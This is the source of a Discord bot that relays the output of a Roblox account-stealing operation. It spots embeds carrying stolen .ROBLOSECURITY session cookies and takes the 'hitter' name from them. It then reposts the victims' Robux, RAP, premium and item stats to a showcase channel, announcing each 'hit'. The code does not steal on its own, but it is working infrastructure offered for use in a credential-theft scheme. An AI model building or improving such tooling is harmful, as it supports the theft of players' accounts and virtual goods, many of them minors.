const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});

// ─── CONFIG (set these in Railway → Variables) ────────────────────────────────
const BOT_TOKEN         = process.env.BOT_TOKEN;
const SOURCE_CHANNEL_ID = process.env.SOURCE_CHANNEL_ID;
const TARGET_CHANNEL_ID = process.env.TARGET_CHANNEL_ID;

if (!BOT_TOKEN || !SOURCE_CHANNEL_ID || !TARGET_CHANNEL_ID) {
  console.error('❌ Missing env vars: BOT_TOKEN, SOURCE_CHANNEL_ID, TARGET_CHANNEL_ID');
  process.exit(1);
}
// ──────────────────────────────────────────────────────────────────────────────

// Field names to keep (matched against field.name, case-insensitive, strips emojis)
const KEEP_FIELD_NAMES = ['robux', 'rap', 'summary', 'premium', 'korblox'];

function cleanText(str) {
  return str.replace(/<[^>]+>/g, '').replace(/:[a-z0-9_]+:/gi, '').trim().toLowerCase();
}

function shouldKeepField(field) {
  const name = cleanText(field.name);
  return KEEP_FIELD_NAMES.some(kw => name.includes(kw));
}

client.once('clientReady', () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
  console.log(`👁  Watching: ${SOURCE_CHANNEL_ID}`);
  console.log(`📤 Forwarding to: ${TARGET_CHANNEL_ID}`);
});

client.on('messageCreate', async (message) => {
  if (message.channel.id !== SOURCE_CHANNEL_ID) return;
  if (!message.embeds || message.embeds.length === 0) return;

  const targetChannel = await client.channels.fetch(TARGET_CHANNEL_ID).catch(() => null);
  if (!targetChannel) return console.error('❌ Target channel not found.');

  // Step 1: get hitter name from cookie embed footer
  let hitterName = null;
  for (const embed of message.embeds) {
    const allText = [
      embed.title, embed.description, embed.author?.name,
      ...(embed.fields?.map(f => f.value) ?? []),
    ].filter(Boolean).join(' ');

    if (allText.includes('ROBLOSECURITY') || allText.includes('WARNING:-DO-NOT-SHARE')) {
      hitterName = embed.footer?.text?.trim() || null;
      break;
    }
  }

  // Step 2: forward hit data embed only
  for (const embed of message.embeds) {
    const allText = [
      embed.title, embed.description, embed.author?.name,
      ...(embed.fields?.map(f => f.value) ?? []),
    ].filter(Boolean).join(' ');

    if (allText.includes('ROBLOSECURITY') || allText.includes('WARNING:-DO-NOT-SHARE')) {
      console.log('⏭  Skipped ROBLOSECURITY embed');
      continue;
    }

    const keptFields = (embed.fields ?? []).filter(shouldKeepField);
    console.log('📋 Kept fields:', keptFields.map(f => f.name));

    if (keptFields.length === 0) {
      console.log('⚠️  No matching fields found, skipping');
      continue;
    }

    const intro = hitterName
      ? `Wow @${hitterName} just getting a hit`
      : `Wow just getting a hit`;

    const rebuilt = new EmbedBuilder();
    rebuilt.setDescription(intro);
    rebuilt.addFields(keptFields.map(f => ({
      name:   f.name,
      value:  f.value,
      inline: f.inline ?? false,
    })));

    if (embed.color)          rebuilt.setColor(embed.color);
    if (embed.timestamp)      rebuilt.setTimestamp(new Date(embed.timestamp));
    if (embed.thumbnail?.url) rebuilt.setThumbnail(embed.thumbnail.url);
    if (embed.author) {
      rebuilt.setAuthor({
        name:    embed.author.name    || '',
        iconURL: embed.author.iconURL || undefined,
        url:     embed.author.url     || undefined,
      });
    }

    await targetChannel.send({ embeds: [rebuilt] }).catch(console.error);
  }
});

client.login(BOT_TOKEN);
